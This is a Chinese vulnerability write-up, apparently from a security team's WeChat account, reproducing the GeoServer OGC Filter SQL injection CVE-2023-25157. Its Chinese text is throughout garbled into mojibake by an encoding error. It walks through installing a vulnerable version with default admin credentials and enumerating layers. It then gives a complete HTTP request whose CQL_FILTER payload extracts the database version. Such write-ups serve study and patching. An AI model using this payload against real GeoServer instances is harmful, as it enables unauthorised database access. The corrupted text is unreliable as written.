#  CVE-2023-25157ï¼šGeoServer OGC Filter SQLæ³¨å…¥æ¼æ´   
åŸåˆ› lyc  Timeline Sec   2023-12-18 18:10  
  
> å…³æ³¨æˆ‘ä»¬â¤ï¸ï¼Œæ·»åŠ æ˜Ÿæ ‡ğŸŒŸï¼Œä¸€èµ·å­¦å®‰å…¨ï¼ä½œè€…ï¼šlyc@Timeline Sec æœ¬æ–‡å­—æ•°ï¼š1296 é˜…è¯»æ—¶é•¿ï¼š2ï½4min å£°æ˜ï¼šä»…ä¾›å­¦ä¹ å‚è€ƒä½¿ç”¨ï¼Œè¯·å‹¿ç”¨ä½œè¿æ³•ç”¨é€”ï¼Œå¦åˆ™åæœè‡ªè´Ÿ  
  
## 0x01 ç®€ä»‹  
  
GeoServeræ˜¯OpenGIS Web æœåŠ¡å™¨è§„èŒƒçš„ J2EE å®ç°ï¼Œåˆ©ç”¨ GeoServer å¯ä»¥æ–¹ä¾¿çš„å‘å¸ƒåœ°å›¾æ•°æ®ï¼Œå…è®¸ç”¨æˆ·å¯¹ç‰¹å¾æ•°æ®è¿›è¡Œæ›´æ–°ã€åˆ é™¤ã€æ’å…¥æ“ä½œï¼Œé€šè¿‡ GeoServer å¯ä»¥æ¯”è¾ƒå®¹æ˜“çš„åœ¨ç”¨æˆ·ä¹‹é—´è¿…é€Ÿå…±äº«ç©ºé—´åœ°ç†ä¿¡æ¯ã€‚  
## 0x02 æ¼æ´æ¦‚è¿°  
  
**æ¼æ´ç¼–å·ï¼šCVE-2023-25157**åœ¨2.22.1å’Œ2.21.4ä¹‹å‰ç‰ˆæœ¬ä¸­ï¼Œåœ¨å¼€æ”¾åœ°ç†ç©ºé—´è”ç›Ÿï¼ˆOGCï¼‰æ ‡å‡†å®šä¹‰çš„è¿‡æ»¤å™¨å’Œå‡½æ•°è¡¨è¾¾å¼ä¸­å‘ç°äº†ä¸€ä¸ªSQLæ³¨å…¥é—®é¢˜ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è¿›è¡ŒSQLæ³¨å…¥ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚  
## 0x03 å½±å“ç‰ˆæœ¬  
  
geoserver<2.18.72.19.0<=geoserver<2.19.72.20.0<=geoserver<2.20.72.21.0<=geoserver<2.21.42.22.0<=geoserver<2.22.2  
## 0x04 ç¯å¢ƒæ­å»º  
  
GeoServerçš„ç¯å¢ƒæ­å»ºæœ‰å¤šç§é€‰æ‹©ï¼Œè¿™é‡Œä¸‹è½½Windowsç‰ˆã€‚  
  
ä¸‹è½½é“¾æ¥ï¼šhttps://sourceforge.net/projects/geoserver/files/GeoServer/2.22.0/GeoServer-2.22.0-winsetup.exe/download  
  
ä¸‹è½½å¥½ä¹‹åï¼Œå¼€å§‹å®‰è£…  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshkb2yHrkxpUqsh6icUm8QSulfcYicQk6Nzuia5iaSOgJMCM84LCSfyickJ6VeyMnxYQzyVzySmUIoVIeQ/640?wx_fmt=png&from=appmsg "")  
  
å®‰è£…æ­¤æœåŠ¡ä¹‹å‰ï¼Œè¿˜éœ€è¦é…ç½®å¥½javaç¯å¢ƒï¼Œå¦åˆ™ä¸èƒ½è¿›è¡Œä¸‹ä¸€æ­¥çš„ç¯å¢ƒå®‰è£…ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshkb2yHrkxpUqsh6icUm8QSuNWibw88uJiaibQOBZJOWbqRkhJEic3INbMqHcCibWBSQFIOeJkicAPkYLltQ/640?wx_fmt=png&from=appmsg "")  
  
æœåŠ¡çš„ç®¡ç†å‘˜è´¦å·å¯†ç å¦‚ä¸‹ï¼Œå¯ä»¥æŒ‰ç…§é»˜è®¤çš„æ¥ï¼Œä¹Ÿå¯ä»¥è‡ªè¡Œä¿®æ”¹ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshkb2yHrkxpUqsh6icUm8QSuKlZb21dplLhiaian00DbbRa0zMkkWGMKLgY7viaCx5ia1Q6oNSxzCfx5eA/640?wx_fmt=png&from=appmsg "")  
  
è¿™é‡Œé»˜è®¤è®¾ç½®ç«¯å£æ˜¯8080ï¼Œå¯èƒ½ä¼šå†²çªï¼Œå¯ä»¥è‡ªå·±è¿›è¡Œé…ç½®ä¿®æ”¹ï¼Œè¿™é‡Œè®¾ç½®ç«¯å£ä¸º9999ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshkb2yHrkxpUqsh6icUm8QSugEqLricZYxSz7VIcNooibMfHyXgGIJlEh8u6dh5VtX0v7AfVHsYfTKHA/640?wx_fmt=png&from=appmsg "")  
  
ç­‰ä¸€åˆ‡å®‰è£…å®Œæ¯•ä¹‹åï¼ŒGeoServeré»˜è®¤å®‰è£…è·¯å¾„å¦‚ä¸‹ï¼šC:\Program Files\GeoServer\binï¼Œç‚¹å‡»startup.batï¼Œè¿è¡Œè„šæœ¬ï¼Œè„šæœ¬è¿è¡Œä¹‹åï¼Œcmdä¸è¦å…³é—­ã€‚é—®ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshkb2yHrkxpUqsh6icUm8QSudXBNhKIgZzO0Tr7DFRj39PUUcwiaY2YgDibkA1uGiaX8QNedP2gqXMAvA/640?wx_fmt=png&from=appmsg "")  
  
è®¿é—®å¦‚ä¸‹ç½‘å€ï¼šhttp://localhost:9999/geoserver/web/ï¼Œè¿™é‡Œç«¯å£ä¸º9999æ˜¯å› ä¸ºä¸Šé¢é…ç½®çš„æ—¶å€™æ˜¯9999ï¼ŒçœŸæ­£è®¿é—®çš„æ—¶å€™ï¼Œéœ€è¦æ ¹æ®è‡ªå·±é…ç½®çš„ç«¯å£è¿›è¡Œè®¿ã€‚å¹¶ä¸”è¾“å…¥ä¸Šé¢çš„è´¦å·å¯†ç ï¼šadmin/geoserverï¼Œç™»é™†è¿›å…¥Geoserver  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshkb2yHrkxpUqsh6icUm8QSuKJdyFIicibOib0hgKLbbTGDQ7hvgf6BctYFicIyGz4yu7n4ERrEveKSHDg/640?wx_fmt=png&from=appmsg "")  
  
æˆåŠŸç™»é™†è¿›å…¥  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshkb2yHrkxpUqsh6icUm8QSuhboPLaVdFCGZJnbJaMTQpuNibrzwVick4HJJBmTlokUicFhnVFw8ByjCg/640?wx_fmt=png&from=appmsg "")  
## 0x05 æ¼æ´å¤ç°  
  
åœ¨è¿›è¡ŒSQLæ³¨å…¥æ¼æ´å¤ç°ä¹‹å‰ï¼Œé¦–å…ˆéœ€è¦è·å–åœ°ç†å›¾å±‚åˆ—è¡¨ä¿¡æ¯ï¼Œè¿™ä¸ªä¿¡æ¯æ˜¯SQLæ³¨å…¥payloadä¸­ä¸€ä¸ªå¿…éœ€çš„å‚æ•°ã€‚  
  
é€šè¿‡ä»¥ä¸‹è·¯å¾„è®¿é—®ï¼Œè·å–åœ°ç†å›¾å±‚åˆ—è¡¨ä¿¡æ¯ã€‚  
```
http://192.168.254.170:9999/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities

```  
  
<Name>æ ‡ç­¾ä¸­çš„ä¿¡æ¯ï¼Œå°±æ˜¯åœ°ç†å›¾å±‚åˆ—è¡¨ã€‚è¿™é‡Œé€‰æ‹©ne:populated_placesä½œä¸ºåœ°ç†å›¾å±‚åˆ—è¡¨ä¿¡æ¯  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshkb2yHrkxpUqsh6icUm8QSukul8jOD02bh4yyEIolqHtGAFIBbUpGJ2MM7bOGXCnuueIFR2GOnxsQ/640?wx_fmt=png&from=appmsg "")  
  
æ¥ç€è®¿é—®ä»¥ä¸‹è·¯å¾„ï¼Œè·å–å›¾å±‚çš„å±æ€§åç§°  
```
http://192.168.254.170:9999/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=ne:populated_places&maxFeatures=1&outputFormat=json

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshkb2yHrkxpUqsh6icUm8QSuH58ODzYA3kr5zKp5bLYSiawaL0SibicNCK13QrQLiapICkPuw0icJdNw3aQ/640?wx_fmt=png&from=appmsg "")  
  
æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š  
```
GETÂ /geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=gwpd:chinamap11&CQL_FILTER=strStartsWith%28VaticanÂ City%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+INTEGER%29%29+--+%27%29+%3D+trueÂ HTTP/1.1
Host:Â 192.168.254.170:9999
Cache-Control:Â max-age=0
Upgrade-Insecure-Requests:Â 1
User-Agent:Â Mozilla/5.0Â (WindowsÂ NTÂ 10.0;Â Win64;Â x64)Â AppleWebKit/537.36Â (KHTML,Â likeÂ Gecko)Â Chrome/120.0.0.0Â Safari/537.36
Accept:Â text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding:Â gzip,Â deflate
Accept-Language:Â zh-CN,zh;q=0.9
Cookie:Â JSESSIONID=1p6q6kkghu4bg1x04chtdvm369
Connection:Â close

```  
  
æŸ¥è¯¢åˆ°äº†æ•°æ®åº“çš„ç‰ˆæœ¬ä¿¡æ¯  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshkb2yHrkxpUqsh6icUm8QSubxq4qm7rHxUEoLQvKD2lIjf9uZp0YWHgMicWc8G9KwyegHXYwmoWricA/640?wx_fmt=png&from=appmsg "")  
## 0x06 ä¿®å¤æ–¹å¼  
  
å®˜æ–¹å·²ç»å‘å¸ƒæœ€æ–°ç‰ˆæœ¬ï¼Œå¯ä»¥ä¸‹è½½æ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬ã€‚  
## å‚è€ƒé“¾æ¥  
  
https://blog.csdn.net/weixin_48539059/article/details/132622485  
  
[https://mp.weixin.qq.com/s/5bTlz3MiUU-NUGdvxPfnMg](https://mp.weixin.qq.com/s?__biz=Mzk0MDQzNzY5NQ==&mid=2247487190&idx=1&sn=45f0e3e862face906488fb2408abd3f9&scene=21#wechat_redirect)  
  
  
https://www.freebuf.com/vuls/370086.html  
  
**æ¨èæœåŠ¡**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/VfLUYJEMVsjT9XsXuYuJ5o1RJZ95l1HcXV5tiaKbHOU6uPrSgotxOAWBYGLbxmjWj4bib26lsefdkTR94Zj8Djdw/640?wx_fmt=gif "")  
  
  
**å†å²æ¼æ´**  
  
geoserver-default-loginCVE-2023-43795CVE-2023-25157CVE-2022-24816CVE-2021-40822  
  
  
**åå°åŠŸèƒ½**  
  
å›å¤ã€  
1  
ã€‘é¢†å–æ–°äººå­¦ä¹ èµ„æ–™å›å¤ã€  
2  
ã€‘è¿›å…¥æ¼æ´æŸ¥è¯¢åŠŸèƒ½å›å¤ã€  
3  
ã€‘è·å–åŠ ç¾¤æ–¹å¼å›å¤ã€  
4  
ã€‘é¢†å–å®‰å…¨ç”µå­ä¹¦ç±  
  
å›å¤ã€  
5  
ã€‘è¿›å…¥SRC-QQäº¤æµç¾¤  
  
  
**å•†åŠ¡åˆä½œ**  
  
[Timeline Secå›¢é˜Ÿå¯åˆä½œé¡¹ç›®æ¸…å•](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247491949&idx=1&sn=5fd239d21a4a07859707b810c2a431ab&chksm=903ac79da74d4e8bf12c52fa3f3a0b14a9fbca35472362d4c40a4d9a6968a16e8d449896889c&scene=21#wechat_redirect)  
  
  
  
